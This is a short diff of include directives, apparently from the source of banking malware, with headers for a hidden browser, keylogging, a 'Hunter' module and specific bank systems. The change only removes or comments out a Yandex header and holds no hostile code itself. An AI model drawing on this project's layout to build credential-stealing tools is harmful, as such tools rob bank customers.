@@ -24,7 +24,6 @@
 #include "StealthBrowser.h" // Скрытый браузер
 
 #include "KeyLogSystems.h" 
-#include "Yandex.h"
 
 
 #include "Hunter.h" 
@@ -54,7 +53,7 @@
 #include "IBankSystem.h"
 #include "avangard.h"
 
-#include "yandex.h"
+//#include "yandex.h"
 
 
 
